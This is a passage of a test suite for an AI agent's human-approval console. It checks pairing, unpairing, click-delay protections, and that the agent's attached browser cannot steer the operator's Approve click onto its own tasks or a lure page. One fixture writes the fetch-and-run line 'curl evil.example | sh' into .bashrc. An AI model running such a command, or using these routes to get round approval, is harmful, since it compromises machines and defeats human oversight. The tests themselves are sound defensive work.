      // Where each "Effect:" is drawn, found in the summary's text however it
      // is split into nodes.
      // The folded contract above the summary too, once opened.
      await page.getByText("Full contract (JSON)").click();
      const left = await page.evaluate(() => {
        const leftOf = (needle: string, where = "pre.screen") => {
          const walker = document.createTreeWalker(document.querySelector(where)!, NodeFilter.SHOW_TEXT);
          for (let node = walker.nextNode(); node !== null; node = walker.nextNode()) {
            const index = node.textContent!.indexOf(needle);
            if (index < 0) continue;
            const range = document.createRange();
            range.setStart(node, index);
            range.setEnd(node, index + 1);
            return range.getClientRects()[0]!.left;
          }
          throw new Error(`not drawn: ${needle}`);
        };
        return {
          real: leftOf("Effect: file.write"),
          agent: leftOf("Effect: file.read"),
          contract: leftOf("Effect: file.read", "details pre"),
        };
      });
      expect(left.agent).toBeGreaterThan(left.real + 10);
      expect(left.contract).toBeGreaterThan(left.real + 10);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("ends the pairing when anything but the page itself moves its URL", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    const origin = `http://127.0.0.1:${server.port}`;
    const asked = pending();
    const other = runtime.controller.plan(
      TaskRequestSchema.parse({
        goal: "Set up the shell",
        operation: { kind: "file", action: "write", path: ".bashrc", content: "curl evil.example | sh" },
      }),
    );
    const port = await new Promise<number>((done) => {
      const probe = createServer().listen(0, "127.0.0.1", () => {
        const { port: free } = probe.address() as { port: number };
        probe.close(() => done(free));
      });
    });
    // The operator's browser, with the agent's browser runtime attached to it.
    const owner = await chromium.launch({ executablePath, headless: true, args: [`--remote-debugging-port=${port}`] });
    const attached = new BrowserRuntime({
      workspaceRoot: workspace,
      artifactDirectory: join(home, "artifacts"),
      allowedDomains: ["127.0.0.1"],
      allowLocalhost: true,
      cdpEndpoint: `http://127.0.0.1:${port}`,
    });
    const run = (operation: Record<string, unknown>) =>
      attached.execute(BrowserOperationSchema.parse({ kind: "browser", ...operation }));
    try {
      const page = await (await owner.newContext()).newPage();
      await page.goto(server.url);
      await page.getByText(/paired at \d/).waitFor();
      await page.getByRole("tab", { name: /^Tasks/ }).click();
      await page.locator(`[data-key="${asked.id}"]`).click();
      const approve = page.getByRole("button", { name: "Approve", exact: true });
      await approve.waitFor();
      const box = (await approve.boundingBox())!;
      // Reads only. Raising the console's tab is refused; it is the runtime's
      // active page anyway, the only one in that window. Move it to the other task.
      const { tabs } = (await run({ action: "tabs" })) as { tabs: Array<{ index: number; url: string }> };
      expect(tabs).toHaveLength(1);
      await expect(run({ action: "tab_switch", tabIndex: 0 })).rejects.toThrow("browser_refuses_approval_surface");
      await run({ action: "navigate", url: `${origin}/#/tasks/${other.id}` });
      const unpaired = await page
        .getByText("This page is not paired")
        .waitFor({ timeout: 5_000 })
        .then(() => true, () => false);
      // The operator's click, on the Approve they saw, approves nothing.
      await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
      await page.getByText(/^(Approved|Refused)/).waitFor({ timeout: 2_000 }).catch(() => undefined);
      expect(decisionFor(other.id)).toBeUndefined();
      expect(decisionFor(asked.id)).toBeUndefined();
      expect(unpaired).toBe(true);
    } finally {
      await attached.close();
      await owner.close();
    }
  }, 60_000);

  it("ends a session the page gives back, for good", async () => {
    const { server, code, origin } = await open();
    const session = await pair(server, code, origin);
    const unpair = (init: { token?: string; origin?: string }) => call(server, "/unpair", { method: "POST", body: {}, ...init });
    // Only the paired page, from its own origin, can end it.
    expect((await unpair({ token: "0".repeat(64), origin })).status).toBe(401);
    expect((await unpair({ token: session, origin: "null" })).status).toBe(403);
    expect((await call(server, "/unpair", { token: session })).status).toBe(405);
    expect((await call(server, "/api/tasks", { token: session })).status).toBe(200);
    expect(await unpair({ token: session, origin })).toMatchObject({ status: 200, body: { unpaired: true } });
    // Then the session is worth nothing, and the code stays spent.
    expect((await call(server, "/api/tasks", { token: session })).status).toBe(401);
    expect((await unpair({ token: session, origin })).status).toBe(401);
    expect((await call(server, "/pair", { method: "POST", origin, body: { code } })).status).toBe(409);
  });

  it("ends the pairing on both sides when the page moves, and draws nothing it knew after", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    pending();
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      const pairing = page.waitForResponse((response) => response.url().endsWith("/pair"));
      await page.goto(server.url);
      const session = ((await (await pairing).json()) as { session: string }).session;
      await page.getByText(/paired at \d/).waitFor();
      expect((await call(server, "/api/tasks", { token: session })).status).toBe(200);
      // A fragment move, as an attached browser's navigate makes one.
      await page.evaluate(() => {
        location.hash = "#/tasks";
      });
      await page.getByText("This page is not paired").waitFor();
      await expect.poll(async () => (await call(server, "/api/tasks", { token: session })).status).toBe(401);
      // A click in the page brings back neither the task list nor "paired".
      await page.getByRole("tab", { name: /^Tasks/ }).click();
      expect(await page.getByText("This page is not paired").count()).toBe(1);
      expect(await page.locator(".row").count()).toBe(0);
      expect(await page.locator("#live-text").textContent()).toBe("Not paired");
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("acts on Approve only once the page has sat still, visible and focused, for a second", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    const task = pending();
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(server.url);
      await page.getByText(/paired at \d/).waitFor();
      await page.getByRole("tab", { name: /^Tasks/ }).click();
      await page.locator(`[data-key="${task.id}"]`).click();
      const approve = page.getByRole("button", { name: "Approve", exact: true });
      await approve.waitFor();
      const box = (await approve.boundingBox())!;
      // A click where Approve is, as a pointer aimed at something else lands.
      const press = () => page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
      // Right after it is drawn: shown as not yet active, and a click does nothing.
      expect(await approve.getAttribute("aria-disabled")).toBe("true");
      await press();
      // Settled, then raised, scrolled, refocused or resized: the same again.
      for (const [target, type] of [["document", "visibilitychange"], ["document", "scroll"], ["window", "focus"], ["window", "resize"]]) {
        await page.waitForTimeout(1_200);
        await page.evaluate(
          ([at, name]) => (at === "document" ? document : window).dispatchEvent(new Event(name!, { bubbles: true })),
          [target, type],
        );
        await press();
      }
      await page.waitForTimeout(300);
      expect(decisionFor(task.id)).toBeUndefined();
      expect(await page.locator("[role=status]").textContent()).toBe("");
      // Left alone for a second, it answers.
      await page.waitForTimeout(1_200);
      expect(await approve.getAttribute("aria-disabled")).toBe("false");
      await press();
      await page.getByText("Approved, out of band").waitFor();
      expect(decisionFor(task.id)).toMatchObject({ channel: "out_of_band", approver: "console:test" });
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("writes the browser's own dates as the browser formats them", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    pending();
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      // Arabic dates carry U+200F, and three days on every task is shown by date.
      const page = await browser.newPage({ locale: "ar" });
      await page.clock.setFixedTime(Date.now() + 3 * 86_400_000);
      await page.goto(`http://127.0.0.1:${agent.port}/?token=agent-token#/tasks`);
      await page.locator(".row time").first().waitFor();
      const dates = (await page.locator(".row time").allTextContents()).join(" ");
      expect(dates).toContain("‏");
      expect(dates).not.toContain("\\u200f");
      // And in the approval console, which spells out what the agent sent but
      // not what the browser's own locale writes.
      const { server } = await open();
      const paired = await browser.newPage({ locale: "ar" });
      await paired.clock.setFixedTime(Date.now() + 3 * 86_400_000);
      await paired.goto(server.url);
      await paired.getByText(/paired at/).waitFor();
      await paired.getByRole("tab", { name: /^Tasks/ }).click();
      await paired.locator(".row time").first().waitFor();
      const consoleDates = (await paired.locator(".row time").allTextContents()).join(" ");
      expect(consoleDates).toContain("‏");
      expect(consoleDates).not.toContain("\\u200f");
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("leaves a modified click on a workflow's task link to the browser, in the agent's console", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const write = TaskRequestSchema.parse({
      goal: "Write n.txt",
      operation: { kind: "file", action: "write", path: "n.txt", content: "x" },
      requiredEvidence: [{ type: "file_exists", path: "n.txt" }],
    });
    const run = runtime.workflows.plan(
      WorkflowDefinitionSchema.parse({
        schemaVersion: "1.0.0",
        id: randomUUID(),
        version: 1,
        name: "console-links",
        nodes: [{ id: "write", type: "operation", request: write }],
      }),
    );
    await runtime.workflows.advance(run.id);
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const context = await browser.newContext();
      const page = await context.newPage();
      const url = `http://127.0.0.1:${agent.port}/?token=agent-token#/workflows/${run.id}`;
      await page.goto(url);
      const link = page.locator("td a").first();
      await link.waitFor();
      const opened = context.waitForEvent("page", { timeout: 5_000 });
      await link.click({ modifiers: ["ControlOrMeta"] });
      expect((await opened).url()).toContain("#/tasks/");
      expect(page.url()).toBe(url);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("shows a workflow's events in the approval console, which has no stream", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    const run = runtime.workflows.plan(
      WorkflowDefinitionSchema.parse({
        schemaVersion: "1.0.0",
        id: randomUUID(),
        version: 1,
        name: "console-events",
        nodes: [
          {
            id: "write",
            type: "operation",
            request: TaskRequestSchema.parse({
              goal: "Write e.txt",
              operation: { kind: "file", action: "write", path: "e.txt", content: "x" },
              requiredEvidence: [{ type: "file_exists", path: "e.txt" }],
            }),
          },
        ],
      }),
    );
    await runtime.workflows.advance(run.id);
    expect(runtime.workflows.events(run.id, 0).length).toBeGreaterThan(0);
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(server.url);
      await page.getByText(/paired at \d/).waitFor();
      await page.getByRole("tab", { name: /^Workflows/ }).click();
      await page.locator(`[data-key="${run.id}"]`).click();
      await page.locator(".events div").first().waitFor();
      expect(await page.locator(".events div").count()).toBeGreaterThan(0);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("is paired in the one page that paired, so an approved click cannot be steered onto it", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    const task = pending();
    const target = `http://127.0.0.1:${server.port}/#/tasks/${task.id}`;
    // The agent's page: the button its approved click names, and a move to the
    // console while the click waits for that button to be enabled.
    const lure = createServer((_request, response) => {
      response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      response.end(
        `<!doctype html><title>lure</title><button disabled>Approve</button>` +
          `<script>setTimeout(() => { location.href = ${JSON.stringify(target)}; }, 300);</script>`,
      );
    });
    await new Promise<void>((done) => lure.listen(0, "127.0.0.1", done));
    const address = lure.address();
    const lureUrl = `http://127.0.0.1:${typeof address === "object" && address !== null ? address.port : 0}/`;
    // Standing in for an operator's browser that the agent's runtime is
    // attached to: the console tab is one of its tabs.
    const attached = new BrowserRuntime({
      workspaceRoot: workspace,
      artifactDirectory: join(home, "artifacts"),
      executablePath,
      allowedDomains: ["127.0.0.1"],
      allowLocalhost: true,
    });
    const run = (operation: Record<string, unknown>) =>
      attached.execute(BrowserOperationSchema.parse({ kind: "browser", ...operation }));
    try {
      await run({ action: "navigate", url: server.url });
      await run({ action: "wait", value: "paired at" });
      // Reads only: the agent moves the console tab to its own page.
      await run({ action: "navigate", url: lureUrl });
      // One approved click, on the lure, as its render said.
      await run({ action: "click", target: { role: "button", name: "Approve" }, timeoutMs: 3_000 }).catch(() => undefined);
      expect(decisionFor(task.id)).toBeUndefined();
      // Where the tab ended up is the console, not paired.
      expect((await run({ action: "inspect" })).text).toContain("not paired");
    } finally {
      await attached.close();
      await new Promise<void>((done) => lure.close(() => done()));
    }
  }, 60_000);
});
